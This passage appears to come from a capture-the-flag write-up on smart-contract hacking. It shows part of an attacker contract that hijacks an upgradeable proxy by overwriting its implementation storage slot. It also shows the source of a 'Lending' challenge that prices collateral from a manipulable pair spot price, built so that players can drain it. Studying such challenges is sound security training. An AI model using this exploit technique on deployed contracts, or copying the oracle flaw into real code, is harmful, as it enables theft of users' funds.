</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>public</span><span> player;
</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>immutable</span><span> newExecutor;
</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>immutable</span><span> playerplayer;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>(</span><span style=color:#0086b3>address </span><span>_newExecutor, </span><span style=color:#0086b3>address </span><span>_player){
</span><span>        newExecutor </span><span style=color:#a71d5d;font-weight:700>=</span><span> _newExecutor;
</span><span>        playerplayer </span><span style=color:#a71d5d;font-weight:700>=</span><span> _player;
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>exec</span><span>() </span><span style=color:#a71d5d;font-weight:700>external </span><span>{
</span><span>        owner </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#0086b3>0xdeadbeef</span><span>);
</span><span>        player </span><span style=color:#a71d5d;font-weight:700>=</span><span> playerplayer;
</span><span>        </span><span style=color:#62a35c>_getAddressSlot</span><span>(</span><span style=color:#0086b3>0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span>).value </span><span style=color:#a71d5d;font-weight:700>=</span><span> newExecutor;
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_getAddressSlot</span><span>(</span><span style=color:#0086b3>bytes32 </span><span>slot) </span><span style=color:#a71d5d;font-weight:700>internal pure returns </span><span>(AddressSlot storage r) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>assembly </span><span>{
</span><span>            r.slot </span><span style=color:#a71d5d;font-weight:700>:=</span><span> slot
</span><span>        }
</span><span>    }
</span><span>}
</span><span>
</span><span>contract NewExecutor is Initializable{
</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>public</span><span> owner;
</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>public</span><span> player;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>initialize</span><span>(</span><span style=color:#0086b3>address </span><span>_player) </span><span style=color:#a71d5d;font-weight:700>external initializer </span><span>{
</span><span>        owner </span><span style=color:#a71d5d;font-weight:700>= msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>;
</span><span>        player </span><span style=color:#a71d5d;font-weight:700>=</span><span> _player;
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>isSolved</span><span>() </span><span style=color:#a71d5d;font-weight:700>external pure returns </span><span>(</span><span style=color:#0086b3>bool</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>true</span><span>;
</span><span>    }
</span><span>}
</span></code></pre></div></div><hr><h1 id=lending>Lending</h1><p>P: "You have lending protocol that interacts with interesting pair. You need to steal all funds from lending protocol."<div class=note-container><button class=note-toggle><div class=note-icon><p>Lending.sol</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span style=color:#a71d5d;font-weight:700>pragma solidity ^</span><span style=color:#0086b3>0.8.0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"@openzeppelin/contracts/utils/math/Math.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"../helpers/ERC20.sol"</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>Lending  </span><span>{
</span><span>    </span><span style=color:#0086b3>ERC20 </span><span style=color:#a71d5d;font-weight:700>public</span><span> collateralToken;
</span><span>    </span><span style=color:#0086b3>ERC20 </span><span style=color:#a71d5d;font-weight:700>public</span><span> borrowToken;
</span><span>    Pair </span><span style=color:#a71d5d;font-weight:700>public </span><span>pair;
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>mapping</span><span>(</span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>=> </span><span style=color:#0086b3>uint256</span><span>) </span><span style=color:#a71d5d;font-weight:700>public</span><span> usersCollateral;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>mapping</span><span>(</span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>=> </span><span style=color:#0086b3>uint256</span><span>) </span><span style=color:#a71d5d;font-weight:700>public</span><span> usersUsedCollateral;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>mapping</span><span>(</span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>=> </span><span style=color:#0086b3>uint256</span><span>) </span><span style=color:#a71d5d;font-weight:700>public</span><span> usersBorrowed;
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>(Pair _pair, </span><span style=color:#a71d5d;font-weight:700>ERC20 </span><span>_collateralToken, </span><span style=color:#a71d5d;font-weight:700>ERC20 </span><span>_borrowToken) {
</span><span>        collateralToken </span><span style=color:#a71d5d;font-weight:700>=</span><span> _collateralToken;
</span><span>        pair </span><span style=color:#a71d5d;font-weight:700>=</span><span> _pair;
</span><span>        borrowToken </span><span style=color:#a71d5d;font-weight:700>=</span><span> _borrowToken;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>addCollateral</span><span>(</span><span style=color:#0086b3>uint256 </span><span>amount) </span><span style=color:#a71d5d;font-weight:700>external </span><span>{
</span><span>        collateralToken.</span><span style=color:#62a35c>transferFrom</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>), amount);
</span><span>        usersCollateral[msg.sender] </span><span style=color:#a71d5d;font-weight:700>+=</span><span> amount;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>removeCollateral</span><span>(</span><span style=color:#0086b3>uint256 </span><span>amount) </span><span style=color:#a71d5d;font-weight:700>external </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(usersBorrowed[msg.sender] </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0, </span><span style=color:#183691>"You have debt"</span><span>);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(usersCollateral[msg.sender] </span><span style=color:#a71d5d;font-weight:700>>=</span><span> amount, </span><span style=color:#183691>"Not enough collateral"</span><span>);
</span><span>        collateralToken.</span><span style=color:#62a35c>transfer</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, amount);
</span><span>        usersCollateral[msg.sender] </span><span style=color:#a71d5d;font-weight:700>-=</span><span> amount;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>borrow</span><span>(</span><span style=color:#0086b3>uint256 </span><span>_amount) </span><span style=color:#a71d5d;font-weight:700>external </span><span>{
</span><span>        </span><span style=color:#0086b3>uint256</span><span> needCollateral </span><span style=color:#a71d5d;font-weight:700>=</span><span> _amount </span><span style=color:#a71d5d;font-weight:700>* </span><span style=color:#62a35c>getExchangeRate</span><span>() </span><span style=color:#a71d5d;font-weight:700>/</span><span> 1e18;
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(needCollateral </span><span style=color:#a71d5d;font-weight:700>&lt;=</span><span> usersCollateral[msg.sender], </span><span style=color:#183691>"You don't have enough collateral"</span><span>);
</span><span>
</span><span>        borrowToken.</span><span style=color:#62a35c>transfer</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, _amount);
</span><span>        usersUsedCollateral[msg.sender] </span><span style=color:#a71d5d;font-weight:700>+=</span><span> needCollateral;
</span><span>        usersCollateral[msg.sender] </span><span style=color:#a71d5d;font-weight:700>-=</span><span> needCollateral;
</span><span>        usersBorrowed[msg.sender] </span><span style=color:#a71d5d;font-weight:700>+=</span><span> _amount;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>repay</span><span>(</span><span style=color:#0086b3>uint256 </span><span>_amount) </span><span style=color:#a71d5d;font-weight:700>external </span><span>{
</span><span>        </span><span style=color:#0086b3>uint256</span><span> collateral </span><span style=color:#a71d5d;font-weight:700>= </span><span>(usersUsedCollateral[msg.sender] </span><span style=color:#a71d5d;font-weight:700>*</span><span> _amount) </span><span style=color:#a71d5d;font-weight:700>/</span><span> usersBorrowed[msg.sender];
</span><span>
</span><span>        borrowToken.</span><span style=color:#62a35c>transferFrom</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>), _amount);
</span><span>
</span><span>        usersUsedCollateral[msg.sender] </span><span style=color:#a71d5d;font-weight:700>-=</span><span> collateral;
</span><span>        usersCollateral[msg.sender] </span><span style=color:#a71d5d;font-weight:700>+=</span><span> collateral;
</span><span>        usersBorrowed[msg.sender] </span><span style=color:#a71d5d;font-weight:700>-=</span><span> _amount;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getExchangeRate</span><span>() </span><span style=color:#a71d5d;font-weight:700>public view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return</span><span> pair.</span><span style=color:#62a35c>getSpotPrice</span><span>();
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>isSolved</span><span>() </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>bool</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return</span><span> borrowToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>)) </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0;
</span><span>    }
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>library </span><span style=color:#62a35c>SafeMath </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>add</span><span>(</span><span style=color:#0086b3>uint </span><span>x, </span><span style=color:#0086b3>uint </span><span>y) </span><span style=color:#a71d5d;font-weight:700>internal pure returns </span><span>(</span><span style=color:#0086b3>uint</span><span> z) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>((z = x </span><span style=color:#a71d5d;font-weight:700>+</span><span> y) </span><span style=color:#a71d5d;font-weight:700>>=</span><span> x, </span><span style=color:#183691>'ds-math-add-overflow'</span><span>);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>sub</span><span>(</span><span style=color:#0086b3>uint </span><span>x, </span><span style=color:#0086b3>uint </span><span>y) </span><span style=color:#a71d5d;font-weight:700>internal pure returns </span><span>(</span><span style=color:#0086b3>uint</span><span> z) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>((z = x </span><span style=color:#a71d5d;font-weight:700>-</span><span> y) </span><span style=color:#a71d5d;font-weight:700>&lt;=</span><span> x, </span><span style=color:#183691>'ds-math-sub-underflow'</span><span>);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>mul</span><span>(</span><span style=color:#0086b3>uint </span><span>x, </span><span style=color:#0086b3>uint </span><span>y) </span><span style=color:#a71d5d;font-weight:700>internal pure returns </span><span>(</span><span style=color:#0086b3>uint</span><span> z) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(y </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0 </span><span style=color:#a71d5d;font-weight:700>|| </span><span>(z = x </span><span style=color:#a71d5d;font-weight:700>*</span><span> y) </span><span style=color:#a71d5d;font-weight:700>/</span><span> y </span><span style=color:#a71d5d;font-weight:700>==</span><span> x, </span><span style=color:#183691>'ds-math-mul-overflow'</span><span>);
</span><span>    }
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>library </span><span style=color:#62a35c>UQ112x112 </span><span>{
</span><span>    </span><span style=color:#0086b3>uint224 </span><span style=color:#a71d5d;font-weight:700>constant</span><span> Q112 </span><span style=color:#a71d5d;font-weight:700>=</span><span> 2**112;
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// encode a uint112 as a UQ112x112
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>encode</span><span>(</span><span style=color:#0086b3>uint112 </span><span>y) </span><span style=color:#a71d5d;font-weight:700>internal pure returns </span><span>(</span><span style=color:#0086b3>uint224</span><span> z) {
</span><span>        z </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>uint224</span><span>(y) </span><span style=color:#a71d5d;font-weight:700>*</span><span> Q112; </span><span style=color:#969896;font-style:italic>// never overflows
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// divide a UQ112x112 by a uint112, returning a UQ112x112
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>uqdiv</span><span>(</span><span style=color:#0086b3>uint224 </span><span>x, </span><span style=color:#0086b3>uint112 </span><span>y) </span><span style=color:#a71d5d;font-weight:700>internal pure returns </span><span>(</span><span style=color:#0086b3>uint224</span><span> z) {
</span><span>        z </span><span style=color:#a71d5d;font-weight:700>=</span><span> x </span><span style=color:#a71d5d;font-weight:700>/ </span><span style=color:#0086b3>uint224</span><span>(y);
</span><span>    }
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>interface </span><span style=color:#62a35c>IUniswapV2Callee </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>uniswapV2Call</span><span>(</span><span style=color:#0086b3>address </span><span>sender, </span><span style=color:#0086b3>uint </span><span>amount0, </span><span style=color:#0086b3>uint </span><span>amount1, </span><span style=color:#0086b3>bytes </span><span style=color:#a71d5d;font-weight:700>calldata </span><span>data) </span><span style=color:#a71d5d;font-weight:700>external</span><span>;
</span><span>}
</span><span>
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>Pair </span><span style=color:#a71d5d;font-weight:700>is ERC20 </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>using </span><span>SafeMath  </span><span style=color:#a71d5d;font-weight:700>for </span><span style=color:#0086b3>uint</span><span>;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>using </span><span>UQ112x112 </span><span style=color:#a71d5d;font-weight:700>for </span><span style=color:#0086b3>uint224</span><span>;
</span><span>
</span><span>    </span><span style=color:#0086b3>uint </span><span style=color:#a71d5d;font-weight:700>public constant</span><span> MINIMUM_LIQUIDITY </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>10</span><span style=color:#a71d5d;font-weight:700>**</span><span>3;
</span><span>    </span><span style=color:#0086b3>bytes4 </span><span style=color:#a71d5d;font-weight:700>private constant</span><span> SELECTOR </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>bytes4</span><span>(</span><span style=color:#a71d5d;font-weight:700>keccak256</span><span>(</span><span style=color:#0086b3>bytes</span><span>(</span><span style=color:#183691>'transfer(address,uint256)'</span><span>)));
</span><span>
</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>public</span><span> factory;
</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>public</span><span> token0;
</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>public</span><span> token1;
</span><span>
</span><span>    </span><span style=color:#0086b3>uint112 </span><span style=color:#a71d5d;font-weight:700>private</span><span> reserve0;           </span><span style=color:#969896;font-style:italic>// uses single storage slot, accessible via getReserves
</span><span>    </span><span style=color:#0086b3>uint112 </span><span style=color:#a71d5d;font-weight:700>private</span><span> reserve1;           </span><span style=color:#969896;font-style:italic>// uses single storage slot, accessible via getReserves
</span><span>    </span><span style=color:#0086b3>uint32  </span><span style=color:#a71d5d;font-weight:700>private</span><span> blockTimestampLast; </span><span style=color:#969896;font-style:italic>// uses single storage slot, accessible via getReserves
</span><span>
</span><span>    </span><span style=color:#0086b3>uint </span><span style=color:#a71d5d;font-weight:700>public</span><span> price0CumulativeLast;
</span><span>    </span><span style=color:#0086b3>uint </span><span style=color:#a71d5d;font-weight:700>public</span><span> price1CumulativeLast;
</span><span>    </span><span style=color:#0086b3>uint </span><span style=color:#a71d5d;font-weight:700>public</span><span> kLast; </span><span style=color:#969896;font-style:italic>// reserve0 * reserve1, as of immediately after the most recent liquidity event
</span><span>
</span><span>    </span><span style=color:#0086b3>uint </span><span style=color:#a71d5d;font-weight:700>private</span><span> unlocked </span><span style=color:#a71d5d;font-weight:700>=</span><span> 1;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>modifier </span><span style=color:#62a35c>lock</span><span>() {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(unlocked </span><span style=color:#a71d5d;font-weight:700>==</span><span> 1, </span><span style=color:#183691>'UniswapV2: LOCKED'</span><span>);
</span><span>        unlocked </span><span style=color:#a71d5d;font-weight:700>=</span><span> 0;
</span><span>        </span><span style=color:#a71d5d;font-weight:700>_;
</span><span>        unlocked </span><span style=color:#a71d5d;font-weight:700>=</span><span> 1;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getReserves</span><span>() </span><span style=color:#a71d5d;font-weight:700>public view returns </span><span>(</span><span style=color:#0086b3>uint112</span><span> _reserve0, </span><span style=color:#0086b3>uint112</span><span> _reserve1, </span><span style=color:#0086b3>uint32</span><span> _blockTimestampLast) {
</span><span>        _reserve0 </span><span style=color:#a71d5d;font-weight:700>=</span><span> reserve0;
</span><span>        _reserve1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> reserve1;
</span><span>        _blockTimestampLast </span><span style=color:#a71d5d;font-weight:700>=</span><span> blockTimestampLast;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getSpotPrice</span><span>() </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return</span><span> Math.</span><span style=color:#62a35c>mulDiv</span><span>(reserve1, 1e18, reserve0);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_safeTransfer</span><span>(</span><span style=color:#0086b3>address </span><span>token, </span><span style=color:#0086b3>address </span><span>to, </span><span style=color:#0086b3>uint </span><span>value) </span><span style=color:#a71d5d;font-weight:700>private </span><span>{
</span><span>        (</span><span style=color:#0086b3>bool</span><span> success, </span><span style=color:#0086b3>bytes </span><span style=color:#a71d5d;font-weight:700>memory</span><span> data) </span><span style=color:#a71d5d;font-weight:700>=</span><span> token.</span><span style=color:#a71d5d;font-weight:700>call</span><span>(</span><span style=color:#a71d5d;font-weight:700>abi</span><span>.</span><span style=color:#a71d5d;font-weight:700>encodeWithSelector</span><span>(SELECTOR, to, value));
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(success </span><span style=color:#a71d5d;font-weight:700>&& </span><span>(data.</span><span style=color:#a71d5d;font-weight:700>length ==</span><span> 0 </span><span style=color:#a71d5d;font-weight:700>|| abi</span><span>.</span><span style=color:#a71d5d;font-weight:700>decode</span><span>(data, (</span><span style=color:#0086b3>bool</span><span>))), </span><span style=color:#183691>'UniswapV2: TRANSFER_FAILED'</span><span>);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>event </span><span style=color:#62a35c>Mint</span><span>(</span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>sender, </span><span style=color:#0086b3>uint </span><span>amount0, </span><span style=color:#0086b3>uint </span><span>amount1);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>event </span><span style=color:#62a35c>Burn</span><span>(</span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>sender, </span><span style=color:#0086b3>uint </span><span>amount0, </span><span style=color:#0086b3>uint </span><span>amount1, </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>to);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>event </span><span style=color:#62a35c>Swap</span><span>(
</span><span>        </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>sender,
</span><span>        </span><span style=color:#0086b3>uint </span><span>amount0In,
</span><span>        </span><span style=color:#0086b3>uint </span><span>amount1In,
</span><span>        </span><span style=color:#0086b3>uint </span><span>amount0Out,
</span><span>        </span><span style=color:#0086b3>uint </span><span>amount1Out,
</span><span>        </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>to
</span><span>    );
</span><span>    </span><span style=color:#a71d5d;font-weight:700>event </span><span style=color:#62a35c>Sync</span><span>(</span><span style=color:#0086b3>uint112 </span><span>reserve0, </span><span style=color:#0086b3>uint112 </span><span>reserve1);
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>() </span><span style=color:#62a35c>ERC20</span><span>(</span><span style=color:#183691>"ST"</span><span>, </span><span style=color:#183691>"ST"</span><span>) {
</span><span>        factory </span><span style=color:#a71d5d;font-weight:700>= msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// called once by the factory at time of deployment
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>initialize</span><span>(</span><span style=color:#0086b3>address </span><span>_token0, </span><span style=color:#0086b3>address </span><span>_token1) </span><span style=color:#a71d5d;font-weight:700>external </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender ==</span><span> factory, </span><span style=color:#183691>'UniswapV2: FORBIDDEN'</span><span>); </span><span style=color:#969896;font-style:italic>// sufficient check
</span><span>        token0 </span><span style=color:#a71d5d;font-weight:700>=</span><span> _token0;
</span><span>        token1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> _token1;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// update reserves and, on the first call per block, price accumulators
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_update</span><span>(</span><span style=color:#0086b3>uint </span><span>balance0, </span><span style=color:#0086b3>uint </span><span>balance1, </span><span style=color:#0086b3>uint112 </span><span>_reserve0, </span><span style=color:#0086b3>uint112 </span><span>_reserve1) </span><span style=color:#a71d5d;font-weight:700>private </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(balance0 </span><span style=color:#a71d5d;font-weight:700>&lt;= type</span><span>(</span><span style=color:#0086b3>uint112</span><span>).</span><span style=color:#a71d5d;font-weight:700>max &&</span><span> balance1 </span><span style=color:#a71d5d;font-weight:700>&lt;= type</span><span>(</span><span style=color:#0086b3>uint112</span><span>).</span><span style=color:#a71d5d;font-weight:700>max</span><span>, </span><span style=color:#183691>'UniswapV2: OVERFLOW'</span><span>);
</span><span>        </span><span style=color:#0086b3>uint32</span><span> blockTimestamp </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>uint32</span><span>(</span><span style=color:#a71d5d;font-weight:700>block</span><span>.</span><span style=color:#a71d5d;font-weight:700>timestamp %</span><span> 2</span><span style=color:#a71d5d;font-weight:700>**</span><span style=color:#0086b3>32</span><span>);
</span><span>        </span><span style=color:#0086b3>uint32</span><span> timeElapsed </span><span style=color:#a71d5d;font-weight:700>=</span><span> blockTimestamp </span><span style=color:#a71d5d;font-weight:700>-</span><span> blockTimestampLast; </span><span style=color:#969896;font-style:italic>// overflow is desired
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(timeElapsed </span><span style=color:#a71d5d;font-weight:700>></span><span> 0 && _reserve0 != 0 && _reserve1 != 0) {
</span><span>            </span><span style=color:#969896;font-style:italic>// * never overflows, and + overflow is desired
</span><span>            price0CumulativeLast </span><span style=color:#a71d5d;font-weight:700>+= </span><span style=color:#0086b3>uint</span><span>(UQ112x112.</span><span style=color:#62a35c>encode</span><span>(_reserve1).</span><span style=color:#62a35c>uqdiv</span><span>(_reserve0)) </span><span style=color:#a71d5d;font-weight:700>*</span><span> timeElapsed;
</span><span>            price1CumulativeLast </span><span style=color:#a71d5d;font-weight:700>+= </span><span style=color:#0086b3>uint</span><span>(UQ112x112.</span><span style=color:#62a35c>encode</span><span>(_reserve0).</span><span style=color:#62a35c>uqdiv</span><span>(_reserve1)) </span><span style=color:#a71d5d;font-weight:700>*</span><span> timeElapsed;
</span><span>        }
</span><span>        reserve0 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>uint112</span><span>(balance0);
</span><span>        reserve1 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>uint112</span><span>(balance1);
</span><span>        blockTimestampLast </span><span style=color:#a71d5d;font-weight:700>=</span><span> blockTimestamp;
</span><span>        </span><span style=color:#a71d5d;font-weight:700>emit </span><span style=color:#62a35c>Sync</span><span>(reserve0, reserve1);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// if fee is on, mint liquidity equivalent to 1/6th of the growth in sqrt(k)
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_mintFee</span><span>(</span><span style=color:#0086b3>uint112 </span><span>_reserve0, </span><span style=color:#0086b3>uint112 </span><span>_reserve1) </span><span style=color:#a71d5d;font-weight:700>private returns </span><span>(</span><span style=color:#0086b3>bool</span><span> feeOn) {
</span><span>        </span><span style=color:#0086b3>address</span><span> feeTo </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>address</span><span>(0);
</span><span>        feeOn </span><span style=color:#a71d5d;font-weight:700>=</span><span> feeTo </span><span style=color:#a71d5d;font-weight:700>!= </span><span style=color:#0086b3>address</span><span>(0);
</span><span>        </span><span style=color:#0086b3>uint</span><span> _kLast </span><span style=color:#a71d5d;font-weight:700>=</span><span> kLast; </span><span style=color:#969896;font-style:italic>// gas savings
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(feeOn) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>if </span><span>(_kLast </span><span style=color:#a71d5d;font-weight:700>!=</span><span> 0) {
</span><span>                </span><span style=color:#0086b3>uint</span><span> rootK </span><span style=color:#a71d5d;font-weight:700>=</span><span> Math.</span><span style=color:#62a35c>sqrt</span><span>(</span><span style=color:#0086b3>uint</span><span>(_reserve0).</span><span style=color:#62a35c>mul</span><span>(_reserve1));
</span><span>                </span><span style=color:#0086b3>uint</span><span> rootKLast </span><span style=color:#a71d5d;font-weight:700>=</span><span> Math.</span><span style=color:#62a35c>sqrt</span><span>(_kLast);
</span><span>                </span><span style=color:#a71d5d;font-weight:700>if </span><span>(rootK </span><span style=color:#a71d5d;font-weight:700>></span><span> rootKLast) {
</span><span>                    </span><span style=color:#0086b3>uint</span><span> numerator </span><span style=color:#a71d5d;font-weight:700>=</span><span> totalSupply.</span><span style=color:#62a35c>mul</span><span>(rootK.</span><span style=color:#62a35c>sub</span><span>(rootKLast));
</span><span>                    </span><span style=color:#0086b3>uint</span><span> denominator </span><span style=color:#a71d5d;font-weight:700>=</span><span> rootK.</span><span style=color:#62a35c>mul</span><span>(5).</span><span style=color:#62a35c>add</span><span>(rootKLast);
</span><span>                    </span><span style=color:#0086b3>uint</span><span> liquidity </span><span style=color:#a71d5d;font-weight:700>=</span><span> numerator </span><span style=color:#a71d5d;font-weight:700>/</span><span> denominator;
</span><span>                    </span><span style=color:#a71d5d;font-weight:700>if </span><span>(liquidity </span><span style=color:#a71d5d;font-weight:700>></span><span> 0) </span><span style=color:#62a35c>_mint</span><span>(feeTo, liquidity);
</span><span>                }
</span><span>            }
</span><span>        } </span><span style=color:#a71d5d;font-weight:700>else if </span><span>(_kLast </span><span style=color:#a71d5d;font-weight:700>!=</span><span> 0) {
</span><span>            kLast </span><span style=color:#a71d5d;font-weight:700>=</span><span> 0;
</span><span>        }
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// this low-level function should be called from a contract which performs important safety checks
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>mint</span><span>(</span><span style=color:#0086b3>address </span><span>to) </span><span style=color:#a71d5d;font-weight:700>external lock returns </span><span>(</span><span style=color:#0086b3>uint</span><span> liquidity) {
